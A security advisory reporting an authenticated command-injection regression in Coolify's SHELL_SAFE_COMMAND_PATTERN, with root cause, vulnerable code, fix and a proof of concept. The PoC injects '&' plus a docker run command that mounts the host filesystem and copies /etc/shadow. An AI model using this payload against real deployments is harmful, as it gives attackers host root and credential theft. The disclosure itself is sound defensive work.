repo.description:
## Summary

The fix for the private advisory **GHSA-qqrq-r9h4-x6wp** (commit `23f9156c7`) introduced a strict `SHELL_SAFE_COMMAND_PATTERN`. Two later commits relaxed it to allow `&`, `"`, `'`. Allowing `&` reopens command injection: in bash, `cmd1 & cmd2` runs both. Any team Member can put a payload in `docker_compose_custom_build_command` / `docker_compose_custom_start_command`, deploy, and execute code in the `coolify-helper` container - which has `/var/run/docker.sock` mounted, giving root on the host.

## Root cause

`app/Support/ValidationPatterns.php:47`

```php
// current (vulnerable)
public const SHELL_SAFE_COMMAND_PATTERN = '/^[a-zA-Z0-9 \t._\-\/=:@,+\[\]{}#%^~&"\']+$/';

// commit 23f9156c7 (GHSA-qqrq-r9h4-x6wp fix - safe)
public const SHELL_SAFE_COMMAND_PATTERN = '/^[a-zA-Z0-9 \t._\-\/=:@,+\[\]{}#%^~]+$/';
```

Regressed by:
- `e2ba44d0c` (2026-03-25) - added `&`, `"` ("to support `&&` chaining")
- `e36ae82d9` (2026-04-08) - added `'`

A character-class regex cannot tell `&` (background separator) from `&&` (logical AND).

## Sink

`app/Jobs/ApplicationDeploymentJob.php:730`
```php
executeInDocker($this->deployment_uuid, "cd {$this->basedir} && {$build_command}")
```

`bootstrap/helpers/docker.php:145` (only escapes `'`, lets `&` through):
```php
$escapedCommand = str_replace("'", "'\\''", $command);
return "docker exec {$containerId} bash -c '{$escapedCommand}'";
```

`coolify-helper` container is launched at `ApplicationDeploymentJob.php:2038` with `-v /var/run/docker.sock:/var/run/docker.sock` → code execution inside it = host root via `docker run -v /:/host`.

## PoC

Set `docker_compose_custom_start_command` (or build) to:

```
true & docker run --rm -v /:/h alpine sh -c "cp /h/etc/shadow /h/tmp/leak"
```

Click Deploy. Final command on host:
```
docker exec <UUID> bash -c 'cd /workdir && true & docker run --rm -v /:/h alpine sh -c "cp /h/etc/shadow /h/tmp/leak"'
```
Bash splits on `&` → second command runs → host `/etc/shadow` copied out.

## Fix

Revert the pattern to commit `23f9156c7`'s form (drop `&`, `"`, `'`). For the `&&` use-case, parse with a real shell tokenizer or split the field into structured args - character-class allow-listing cannot safely permit any of `;`, `&`, `|`.

Defense in depth: do not bind-mount `/var/run/docker.sock` into the build helper.
repo.summary: Authenticated RCE via SHELL_SAFE_COMMAND_PATTERN regression → host root
